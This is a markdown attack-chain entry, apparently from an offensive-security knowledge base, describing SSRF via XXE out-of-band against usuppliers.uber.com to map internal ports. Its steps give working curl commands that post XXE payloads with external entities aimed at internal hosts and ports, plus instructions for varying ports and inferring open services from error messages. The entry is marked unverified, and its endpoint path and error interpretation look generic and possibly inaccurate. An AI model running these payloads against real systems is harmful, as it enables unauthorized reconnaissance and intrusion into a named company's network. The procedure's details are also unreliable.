---
id: ac-uber-ssrf-xxe-oob-448598
tags:
  - ssrf
  - xxe
  - oob
  - port-scanning
  - uber
type: attack_chain
tools: []
tactics:
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Send-XXE-Payloads-to-POST-Endpoint]]'
  - '[[procedures/Analyze-Error-Messages-for-Discrepancies]]'
  - '[[procedures/Determine-Open-Internal-Ports]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:39:10.110Z'
description: >-
  A multi-step attack exploiting SSRF through XXE OOB on usuppliers.uber.com to
  identify open internal ports via error message analysis.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Server-Side Request Forgery via XXE Out-of-Band to Probe Internal Ports on Uber Suppliers Portal

Multi-stage attack chain demonstrating exploitation of SSRF via XXE OOB on usuppliers.uber.com to probe internal network ports by sending payloads to a POST endpoint and analyzing error message differences.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Send XXE Payloads] --> B[Analyze Error Messages]
    B --> C[Map Open Ports]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web application on usuppliers.uber.com
- Accessible POST endpoint vulnerable to XXE processing
- Network access to the public-facing endpoint

### Initial Access Requirements

- No credentials required
- Public internet access to the target domain
- Basic knowledge of XML payloads for XXE

## Detailed Attack Procedures

### Step 1: Send XXE Payloads to POST Endpoint
procedure: [[procedures/Send-XXE-Payloads-to-POST-Endpoint]]

**Objective**: Trigger XXE processing by sending crafted payloads to the vulnerable POST endpoint to initiate out-of-band requests.

**Instructions**: Use [[commands/curl-post-xxe-payload]] to send various XXE payloads targeting internal ports (e.g., port 80, 443) via OOB techniques like DNS exfiltration or HTTP requests to internal hosts.

```bash
curl -X POST https://usuppliers.uber.com/upload-endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://internal-host:80/">%xxe;]><root/>'
```

Vary the internal host and port in the payload (e.g., replace 80 with 22, 3306) for different probes.

**Expected Output**: Server response with error messages indicating processing of the XXE payload.

**Success Indicators**:
- HTTP 200 or error response received
- No immediate rejection of XML payload

### Step 2: Analyze Error Messages for Discrepancies
procedure: [[procedures/Analyze-Error-Messages-for-Discrepancies]]

**Objective**: Examine variations in server error messages to infer successful internal connections via OOB XXE.

**Instructions**: Collect responses from multiple payload sends using [[commands/curl-post-xxe-payload]] and manually compare error texts for differences (e.g., timeout vs. connection refused).

```bash
curl -X POST https://usuppliers.uber.com/upload-endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://internal-host:22/">%xxe;]><root/>' > response-port22.txt
```

Review logs or responses for phrases like "connection timed out" (indicating open port) vs. "no route to host" (closed).

**Expected Output**: Text file or console output showing differing error patterns.

**Success Indicators**:
- Distinct error messages observed between payloads
- Patterns correlating to port connectivity

### Step 3: Determine Open Internal Ports
procedure: [[procedures/Determine-Open-Internal-Ports]]

**Objective**: Map open ports based on error analysis to identify exploitable internal services.

**Instructions**: Aggregate findings from error analysis and list ports where OOB requests succeeded (e.g., no refusal errors). Use scripting if scaling, but manual mapping suffices for small sets.

**Expected Output**: A list of open ports, e.g., "Port 80 open, Port 22 closed".

**Success Indicators**:
- Confirmed open ports on internal network
- Potential for follow-on attacks identified

## Attack Chain Summary

### Key Achievements

1. Successfully triggered SSRF via XXE OOB on public endpoint
2. Inferred internal port status without direct access
3. Enabled targeted reconnaissance for internal services

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### MITRE ATT&CK Tactics

- [[Reconnaissance]]

---
*Last updated: 2023-10-01T00:00:00Z*
